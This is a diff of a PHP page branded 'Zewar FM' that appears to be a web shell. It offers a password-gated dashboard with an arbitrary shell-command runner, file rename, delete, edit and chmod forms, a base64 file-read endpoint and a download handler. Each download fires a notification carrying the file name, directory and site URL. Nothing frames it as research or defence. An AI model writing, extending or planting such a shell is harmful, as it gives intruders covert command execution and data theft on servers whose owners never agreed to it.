 <div class="modal-body"><input type="text" id="cmdInput" placeholder="Command (e.g., ls -la)" autocomplete="off"><button class="btn btn-primary" onclick="runCommand()" style="margin-top:5px; width:100%"><i class="fas fa-play"></i> Run</button><div id="cmdOutput" style="display:none; margin-top:15px"><hr><div class="cmd-output" id="cmdOutputText"></div></div></div>
 <div class="modal-footer"><button type="button" class="btn btn-outline" onclick="closeCommandModal()">Close</button></div></div></div>
 
 <div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-pen"></i> Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div>
-<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="old_name" id="renameOld"><div class="modal-body"><input type="text" name="new_name" id="renameNew" placeholder="New name" required></div><div class="modal-footer"><button type="submit" name="rename" class="btn btn-primary">Rename</button><button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">Cancel</button></div></form></div></div>
+<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="old_name" id="renameOld"><div class="modal-body"><input type="text" name="new_name" id="renameNew" placeholder="New name" required></div><div class="modal-footer"><button type="submit" name="rename" class="btn btn-primary">Rename</button><button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">Cancel</button></div></form></div></div>
 
 <div id="deleteModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-trash"></i> Confirm Delete</h3><button class="modal-close" onclick="closeModal('deleteModal')">&times;</button></div>
-<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="item" id="deleteItem"><div class="modal-body"><p>Delete <strong id="deleteName"></strong>?</p><p style="color:#ff9500; font-size:0.75rem">⚠️ Cannot be undone!</p></div><div class="modal-footer"><button type="submit" name="delete" class="btn btn-danger">Delete</button><button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button></div></form></div></div>
+<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="item" id="deleteItem"><div class="modal-body"><p>Delete <strong id="deleteName"></strong>?</p><p style="color:#ff9500; font-size:0.75rem">⚠️ Cannot be undone!</p></div><div class="modal-footer"><button type="submit" name="delete" class="btn btn-danger">Delete</button><button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button></div></form></div></div>
 
 <div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-lock"></i> Change Permission</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div>
-<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="item" id="chmodItem"><div class="modal-body"><select name="permission" id="chmodPerm"><option value="644">644 (rw-r--r--)</option><option value="755">755 (rwxr-xr-x)</option><option value="600">600 (rw-------)</option><option value="700">700 (rwx------)</option><option value="777">777 (rwxrwxrwx)</option></select></div><div class="modal-footer"><button type="submit" name="chmod" class="btn btn-primary">Apply</button><button type="button" class="btn btn-outline" onclick="closeModal('chmodModal')">Cancel</button></div></form></div></div>
+<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="item" id="chmodItem"><div class="modal-body"><select name="permission" id="chmodPerm"><option value="644">644 (rw-r--r--)</option><option value="755">755 (rwxr-xr-x)</option><option value="600">600 (rw-------)</option><option value="700">700 (rwx------)</option><option value="777">777 (rwxrwxrwx)</option></select></div><div class="modal-footer"><button type="submit" name="chmod" class="btn btn-primary">Apply</button><button type="button" class="btn btn-outline" onclick="closeModal('chmodModal')">Cancel</button></div></form></div></div>
 
 <div id="editModal" class="modal"><div class="modal-content" style="max-width:700px"><div class="modal-header"><h3><i class="fas fa-edit"></i> Edit File</h3><button class="modal-close" onclick="closeModal('editModal')">&times;</button></div>
-<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="filename" id="editFilename"><div class="modal-body"><textarea name="content" id="editContent" rows="12" style="font-family:monospace"></textarea></div><div class="modal-footer"><button type="submit" name="save_file" class="btn btn-primary">Save</button><button type="button" class="btn btn-outline" onclick="closeModal('editModal')">Cancel</button></div></form></div></div>
+<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="filename" id="editFilename"><div class="modal-body"><textarea name="content" id="editContent" rows="12" style="font-family:monospace"></textarea></div><div class="modal-footer"><button type="submit" name="save_file" class="btn btn-primary">Save</button><button type="button" class="btn btn-outline" onclick="closeModal('editModal')">Cancel</button></div></form></div></div>
 
 <script>
 function openModal(id) { document.getElementById(id).classList.add('active'); }
@@ -849,7 +790,7 @@ async function runCommand() {
     outputDiv.style.display = 'block';
     try {
         const formData = new FormData();
-        formData.append('csrf_token', 'c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01');
+        formData.append('csrf_token', '<?php echo csrf_token(); ?>');
         formData.append('command', cmd);
         
         const response = await fetch('?ajax_cmd=1', {
@@ -878,6 +819,40 @@ async function editFile(n) { try { let res = await fetch('?get_file=1&f=' + btoa
 document.getElementById('cmdInput')?.addEventListener('keypress', function(e) { if (e.key === 'Enter') runCommand(); });
 window.onclick = function(e) { if (e.target.classList.contains('modal')) e.target.classList.remove('active'); }
 function showToast(msg, type) { let t = document.getElementById('toast'); if(!t){ t=document.createElement('div'); t.id='toast'; t.className='toast'; document.body.appendChild(t); } t.className=`toast ${type} show`; t.innerHTML=msg; setTimeout(()=>t.classList.remove('show'),3000); }
+<?php if ($message): ?>showToast('<?php echo addslashes($message); ?>', '<?php echo $toast_type; ?>');<?php endif; ?>
 </script>
 </body>
 </html>
+<?php
+// Download handler
+if (isset($_GET['download']) && isset($_GET['f'])) {
+    $file = sanitize_filename(base64_decode($_GET['f']));
+    if ($file && file_exists($current . '/' . $file) && is_file($current . '/' . $file)) {
+        send_secure_notification('DOWNLOAD', [
+            'File Name' => $file,
+            'File Size' => format_size(filesize($current . '/' . $file)),
+            'Directory' => $current,
+            'URL' => get_current_url()
+        ]);
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Content-Length: ' . filesize($current . '/' . $file));
+        readfile($current . '/' . $file);
+        exit;
+    }
+}
+// Get file content
+if (isset($_GET['get_file']) && isset($_GET['f'])) {
+    $file = sanitize_filename(base64_decode($_GET['f']));
+    if ($file && file_exists($current . '/' . $file) && is_file($current . '/' . $file)) {
+        echo file_get_contents($current . '/' . $file);
+    }
+    exit;
+}
+
+function get_login_page($error = '') {
+    $csrf = bin2hex(random_bytes(32));
+    $_SESSION['csrf_token'] = $csrf;
+    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Zewar FM - Login</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Inter",sans-serif;min-height:100vh;background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 100%);display:flex;justify-content:center;align-items:center}.login-card{background:rgba(20,20,30,0.95);backdrop-filter:blur(10px);border-radius:24px;padding:40px;width:100%;max-width:400px;border:1px solid rgba(255,215,0,0.3);box-shadow:0 20px 60px rgba(0,0,0,0.5)}.login-card h1{font-size:2rem;background:linear-gradient(135deg,#ffd700,#b800ff);-webkit-background-clip:text;background-clip:text;color:transparent;text-align:center;margin-bottom:10px}.login-card p{text-align:center;color:#aaa;margin-bottom:30px}.input-group{margin-bottom:20px}.input-group input{width:100%;padding:14px 18px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,215,0,0.3);border-radius:12px;color:#fff;font-size:1rem;transition:all 0.3s}.input-group input:focus{outline:none;border-color:#ffd700;background:rgba(255,255,255,0.12)}button{width:100%;padding:14px;background:linear-gradient(135deg,#ffd700,#b800ff);border:none;border-radius:12px;color:#000;font-size:1rem;font-weight:600;cursor:pointer;transition:transform 0.2s}button:hover{transform:translateY(-2px)}.error{background:rgba(255,59,48,0.2);border-left:4px solid #ff3b30;padding:12px;border-radius:8px;margin-top:20px;text-align:center;color:#ff6b6b}</style></head><body><div class="login-card"><h1>🔐 Zewar FM</h1><p>Secure File Management</p><form method="POST"><input type="hidden" name="csrf_token" value="' . $csrf . '"><div class="input-group"><input type="password" name="password" placeholder="Enter Password" required autofocus></div><button type="submit">Access Dashboard</button>' . ($error ? '<div class="error">' . htmlspecialchars($error) . '</div>' : '') . '</form></div></body></html>';
+}
+?>
